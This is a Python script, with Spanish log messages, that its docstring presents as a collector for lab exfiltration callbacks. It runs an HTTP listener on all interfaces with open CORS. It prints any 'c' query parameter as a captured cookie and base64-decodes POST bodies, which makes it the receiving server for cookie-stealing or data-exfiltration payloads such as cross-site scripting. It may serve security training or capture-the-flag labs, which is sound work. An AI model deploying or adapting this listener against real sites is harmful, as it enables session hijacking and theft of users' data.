#!/usr/bin/env python3
from __future__ import annotations

import base64
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

HOST = "0.0.0.0"
PORT = 9000


class CollectorHandler(BaseHTTPRequestHandler):
    """Minimal collector for lab exfiltration callbacks."""

    server_version = "CollectorHTTP/1.0"

    def log_message(self, format: str, *args: object) -> None:
        return

    def _cors(self) -> None:
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        print("\n=== GET recibido ===")
        print(f"Fecha: {datetime.now().isoformat()}")
        print(f"Path: {parsed.path}")
        print(f"Cliente: {self.client_address[0]}")
        print(f"Query: {params}")

        if "c" in params:
            print("\n[Cookie capturada]")
            print(params["c"][0])

        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", "0"))
        raw_body = self.rfile.read(length).decode("utf-8", errors="replace")

        print("\n=== POST recibido ===")
        print(f"Fecha: {datetime.now().isoformat()}")
        print(f"Path: {self.path}")
        print(f"Cliente: {self.client_address[0]}")
        print(f"Body crudo:\n{raw_body}")

        try:
            decoded = base64.b64decode(raw_body).decode("utf-8", errors="replace")
            print("\n[Body decodificado como Base64]")
            print(decoded)
        except Exception as exc:  # pragma: no cover - best effort diagnostic output
            print("\n[No se pudo decodificar como Base64]")
            print(str(exc))

        self.send_response(204)
        self._cors()
        self.end_headers()

def main() -> None:
    server = HTTPServer((HOST, PORT), CollectorHandler)
    print(f"Servidor escuchando en http://{HOST}:{PORT}")
    server.serve_forever()


if __name__ == "__main__":
    main()
